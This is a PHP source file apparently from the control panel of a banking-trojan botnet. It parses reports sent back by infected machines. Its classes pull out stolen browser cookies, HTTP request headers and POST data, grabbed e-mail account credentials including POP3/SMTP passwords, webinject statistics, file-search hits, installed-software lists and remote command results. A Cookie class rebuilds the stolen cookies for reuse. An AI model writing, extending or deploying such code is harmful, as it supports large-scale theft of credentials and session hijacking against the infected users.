<?php
/** Report utilities */



/**
 * Report context parser: type=Cookie (BLT_COOKIES)
 */
class Report_Cookie_Parser {
	/** Browser Executable path
	 * @var string
	 */
	public $browser_exe;

	/** Cookies in there
	 * @var Cookie[]
	 */
	public $cookies = array();

	function __construct($context){
		/* Format:
		 * Wininet(Internet Explorer) cookies:
		 * \n
		 * Path: example.com/a/b/c
		 * name=value
		 * name=value
		 * \n
		 * Path: example.com/
		 */

		$context = array_map('trim', explode("\n", $context));
		$this->browser_exe = array_shift($context);

		# Parse
		$purl = NULL;
		foreach ($context as $line)
			if (is_null($purl)){ # Waiting for 'Path:'
				if (strncasecmp($line, 'path:', 5) !== 0)
					continue;
				# Path:
				$path = trim(substr($line, 5));

				# Parse
				$purl = parse_url("http://$path");

				# We dont' know the domain here precisely, so set it for all subdomains
				if (strncasecmp($purl['host'], 'www.', 4) === 0)
					$purl['host'] = substr($purl['host'], 4);
				$purl['host'] = '.'.$purl['host'];

			} else { # Reading name=value pairs
				if ($line === ''){ # Blank line: end of pairs
					$purl = NULL;
					continue;
				}
				# Read name=value
				list($name, $value) = explode('=', $line, 2);

				# Cookie
				$this->cookies[] = new Cookie($name, $value, $purl['host'], $purl['path']);
			}
	}
}



/**
 * Report context parser: type=HTTP[S] (BLT_HTTP_REQUEST, BLT_HTTPS_REQUEST)
 */
class Report_HTTP_Parser {
	/** Report source URL
	 * @var string
	 */
	public $url;

	/** Report headers
	 * @var string[]
	 */
	public $headers = array();

	/** Cookies
	 * @var string[]|Cookie[]
	 */
	public $cookies = array();

	/** Screen size
	 * @var int[]
	 */
	public $screen = NULL;

	/** User input
	 * @var string
	 */
	public $userinput = '';

	/** POST data string
	 * @var string
	 */
	public $postdata = '';

	/**
	 * @param string    $context
	 * @param bool      $parse_post Parse POST data into key=value pairs. FALSE leave as a string
	 */
	function __construct($context){
		# Split postdata
		if ((  FALSE !== $p=strpos($context, "\n\n")  ) || (  FALSE !== $p=strpos($context, "\r\n\r\n")  )){
			$this->postdata = trim(substr($context, $p));
			$context = trim(substr($context, 0, $p));
		}

		# Parse
		foreach (array_map('trim', explode("\n", $context)) as $line){
			# URL
			if (is_null($this->url)){
				$this->url = $line;
				continue;
			}

			# Name: Value pairs
			$line = str_replace('(w:h):', '(wh):', $line); # else parsing will fail at "Screen(w:h):"
			list($key, $value) = array_map('trim', explode(':', $line, 2));
			$lkey = strtolower($key);

			switch ($lkey){
				# Parameters
				case 'user input':
					$this->userinput = $value;
					break;
				case 'screen(wh)': # modified for parsing
					$this->screen = explode(':', $value);
					break;
				# Cookies
				case 'cookie':
					if ($value !== '-')
						foreach (explode(';', $value) as $v)
							$this->cookies[] = $v;
					break;
				case 'set-cookie':
					$this->cookies[] = $value;
					break;
				# POST data
				case 'post data':
					# ignore
					break;
				# Headers
				case 'useragent': # a special mistyped rename case
					$this->headers['User-Agent'] = $value;
					break;
				default:
					$this->headers[$key] = $value;
					break;
			}
		}
	}

	/** Parse the raw POST data ($this->postdata) into key/value pairs
	 * @return string[]
	 */
	function parse_post(){
		$post = array();
		foreach (array_map('trim', explode("\n", $this->postdata)) as $line){
			list($k, $v) = array_map('rawurldecode', explode('=', $line, 2)) + array(1 => NULL);
			$post[$k] = $v;
		}
		return $post;
	}

	/** Parse the raw Cookies data ($this->cookies) into Cookie objects
	 * @return Cookie[]
	 */
	function parse_cookies(){
		$cookies = array();
		foreach ($this->cookies as $cookie)
			$cookies[] = Cookie::from_header($cookie, $this->url);
		return $cookies;
	}
}



/**
 * Report context parser: type=DEBUG (BLT_DEBUG)
 */
class Report_Debug_Parser {
	/** Module ID
	 * @var int
	 */
	public $module;

	/** Error type: UNKNOWN, FAILURE, ERROR, UNEXPECTED
	 * @var string
	 */
	public $type;

	/** Error title
	 * @var string
	 */
	public $title;

	/** Error info (message-type-dependent)
	 * @var string
	 */
	public $info;

	function __construct($context){
		# "Module: %u\r\nType: %s\r\nTitle: %s\r\nInfo: %s\r\n"
		foreach (array_map('trim', explode("\n", $context)) as $line){
			if (!strlen($line))
				continue;

			list($name, $value) = explode(': ', $line, 2);
			$this->{strtolower($name)} = $value;
		}
	}

	/** Parse info for webinjects
	 * @return stdClass
	 */
	function parse_webinjects_info(){
		# fileName=[%S], fileSize=[%u], fileCRC32=[0x%08X], processedInjects=[%u]
		$format = 'fileName=[%s], fileSize=[%d], fileCRC32=[%s], processedInjects=[%d]';
		$info = new stdClass;
		sscanf($this->info, $format, $info->fileName, $info->fileSize, $info->fileCRC32, $info->processedInjects);
		return $info;
	}
}



/**
 * Report context parser: type=Gabbed E-Mail (BLT_GRABBED_EMAILSOFTWARE)
 */
class Report_Email_Parser {
    /** Configured e-mail accounts
     * { name: string,
     *   email: string,
     *   pop3: {server: string, username: string, password: string},
     *   smtp: {server: string, username: string, password: string},
     * }
     * @var array
     */
    public $accounts = array();

    /** Addressbook of e-mail addresses
     * @var string[]
     */
    public $addresses = array();

    function __construct($context){
        #$n = preg_match_all('~^(?<!=\s)(?:.+;\s*)?(?:[^\s]+@[^\s]+)$~mS', $context, $m); # Does not start with whitespace, possibly has the name followed by ';', then - e-mail
        #$this->addresses = $m[0];
        /** Parser FSM that points to a property with an object currently being parsed
         * null: `name:value` pair || e-mail address
         * 'pop3': POP3 record
         * 'smtp': SMTP record
         */
        $prop = NULL;
        $last_account = NULL;
        foreach (array_filter(array_map('trim', explode("\n", $context))) as $l){
            # E-mail address
            if (strpos($l, ':') === FALSE){
                $this->addresses[] = $l;
                $prop = NULL;
                continue;
            }

            # Name: Value pair
            list($name,$value) = array_map('trim', explode(':', $l, 2));
                switch ($name){
                    case 'Account name':
                        $last_account = (object)array(
                            'name' => $value,
                            'email' => NULL,
                            'pop3' => (object)array('server' => NULL, 'username' => NULL, 'password' => NULL),
                            'smtp' => (object)array('server' => NULL, 'username' => NULL, 'password' => NULL),
                        );
                        $this->accounts[] = $last_account;
                        break;
                    case 'E-mail':
                        $last_account->email = $value;
                        break;
                    case 'POP3':
                        $prop = 'pop3';
                        break;
                    case 'SMTP':
                        $prop = 'smtp';
                        break;
                    default:
                        if ($prop === 'smtp' || $prop === 'pop3'){
                            $name = strtolower($name);
                            $last_account->$prop->$name = $value;
                        }
                }
        }
    }
}



/**
 * Report context parser: type=File Search report (BLT_FILE_SEARCH)
 */
class Report_FileSearch_Parser {
    /** Found files
     * { name: string,
     *   path: string,
     *   hash: string,
     *   size: int,
     *   time: string
     * }
     * @var array
     */
    public $files = array();

    function __construct($context){
        foreach (array_filter(array_map('trim',explode('-----', $context))) as $fileReport){
            $file = (object)array('name' => null, 'path' => null, 'hash' => null, 'size' => null, 'time' => null);
            foreach (array_filter(array_map('trim', explode("\n", $fileReport))) as $field){
                list($name, $value) = array_map('trim', explode(':', $field, 2));
                $name = strtolower($name);
                switch ($name){
                    case 'name':
                    case 'path':
                    case 'hash':
                    case 'time':
                        $file->{$name} = $value;
                        break;
                    case 'size':
                        $file->{$name} = (int)$value;
                        break;
                }
            }
            $this->files[] = $file;
        }
    }
}



/**
 * Report context parser: type=Installed Software (BLT_ANALYTICS_SOFTWARE)
 */
class Report_AnalyticsSoftware_Parser {
    /**
     * @var {{full: String, vendor: String, productv: String, product: String, version: String}}
     */
    public $soft;

    function __construct($context){
        // (01: <vendor> | <product> | <version>\n)+
        preg_match_all('~^\d+:\s*([^|]*)\s*\|\s*([^|]*)\s*\|\s*([^|]*)\s*$~ium', $context, $m, PREG_SET_ORDER);
        foreach ($m as $l){
            $this->soft[] = $soft = new stdClass;
            list($soft->full, $soft->vendor, $soft->productv, $soft->version) = array_map('trim', $l);
            $soft->product = rtrim($soft->productv, '0123456789. '); # product name with trimmed version string
        }
    }
}



/**
 * Report context parser: type=Command-Line Result (BLT_COMMANDLINE_RESULT)
 */
class Report_CommandLine_Parser {
    /**
     * @var CmdResult[]
     */
    public $commands;

    function __construct($context){
        require_once 'system/reports_cmdlist_cmdprocessor.php';
        $this->commands = process_command_list(null, $context);
    }

    function parse(){
        foreach ($this->commands as $cmd)
            $cmd->parse();
    }
}






/**
 * Cookie utility: Parser & Formatter
 */
class Cookie {
	/** Cookie name
	 * @var string
	 */
	public $name;

	/** Cookie value
	 * @var string
	 */
	public $value;

	/** Cookie domain
	 * 'Domain=.foo.com'
	 * @var string
	 */
	public $domain;

	/** Cookie path
	 * 'Path=/'
	 * @var string|null
	 */
	public $path;

	/** Cookie expiration
	 * 'Expires=Tue, 15 Jan 2013 21:47:38 GMT'
	 * @var int|null
	 */
	public $expires;

	/** Is secure?
	 * 'Secure'
	 * @var bool
	 */
	public $is_secure = FALSE;

	/** Is secure?
	 * 'HttpOnly'
	 * @var bool
	 */
	public $is_httponly = FALSE;

	/** Constuct a cookie from 'Set-Cookie' header value string
	 * @param string $header Cookie definition string: "name=val; path=/; domain=.myproxylists.com; expires=Wed, 28-May-2014 10:34:26 GMT"
	 * @param string $url The originating URL to default the domain & path
	 * @return Cookie
	 */
	static function from_header($header, $url = NULL){
		# Parse
		$c = array();
		foreach (explode(';', $header) as $s)
			if (strlen($s = trim($s))){
				$s = array_map('trim', explode('=', $s, 2));
				if (empty($c)) # Cookie name=value
					$c = array('name' => rawurldecode($s[0]), 'value' => rawurldecode($s[1]));
				else # Cookie params
					$c[ strtolower($s[0]) ] = (count($s) == 1)? TRUE : $s[1];
			}

		# Parse
		if (isset($c['expires'])){
			$c['expires'] = strtotime($c['expires']);
			if ($c['expires'] === FALSE)
				$c['expires'] = NULL;
		}

		# Defaults
		if (!isset($c['domain']))
			$c['domain'] = is_null($url)? NULL : ('.'.parse_url($url, PHP_URL_HOST));
		$c += array('name' => NULL, 'value' => NULL, 'expires' => NULL, 'domain' => NULL, 'path' => '/');

		# Tuning
		foreach (array('www.', '.www.') as $pfx)
			if (strncasecmp($c['domain'], $pfx, $pfxl = strlen($pfx)) === 0)
				$c['domain'] = '.'.substr($c['domain'], $pfxl);

		# Build
		$cookie = new Cookie($c['name'], $c['value'], $c['domain'], $c['path'], $c['expires']);
		if (isset($c['secure']))
			$cookie->is_secure = TRUE;
		if (isset($c['httponly']))
			$cookie->is_httponly = TRUE;
		return $cookie;
	}

	function __construct($name, $value, $domain = NULL, $path = NULL, $expires = NULL){
		$this->name = $name;
		$this->value = $value;
		$this->domain = $domain;
		$this->path = $path;
		$this->expires = $expires;
	}

	/** Get formatted params as a keyed array
	 * Flag parameters (HttpOnly, Secure) have `true` as a value.
	 * @return string[]
	 */
	function getParamsArray(){
		$ret = array();
		if (!is_null($this->domain))
			$ret['Domain'] = $this->domain;
		if (!is_null($this->path))
			$ret['Path'] = $this->path;
		if (!is_null($this->expires))
			$ret['Expires'] = date('r', $this->expires);
		if ($this->is_httponly)
			$ret['HttpOnly'] = TRUE;
		if ($this->is_secure)
			$ret['Secure'] = TRUE;
		return $ret;
	}

	protected function _getParamsStr(){
		$ret = '';
		foreach ($this->getParamsArray() as $name => $value)
			$ret .= "; $name".($value !== TRUE? "=$value" : '');
		return $ret;
	}

	function __toString(){
		return rawurlencode($this->name).'='.rawurlencode($this->value).$this->_getParamsStr();
	}

       
	function toHatKeeperValue(){
		return rawurlencode($this->value).$this->_getParamsStr();
	}
}
